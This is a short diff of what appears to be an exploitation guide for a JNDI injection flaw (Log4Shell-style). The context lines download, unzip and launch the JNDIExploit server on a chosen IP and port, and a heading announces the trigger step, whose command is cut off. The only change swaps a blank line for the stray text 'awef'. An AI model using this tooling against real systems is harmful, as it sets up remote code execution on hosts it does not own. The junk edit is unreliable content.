@@ -28,7 +28,7 @@ wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploi
 unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
-
+awef
 * Then, trigger the exploit using:
 
 ```bash
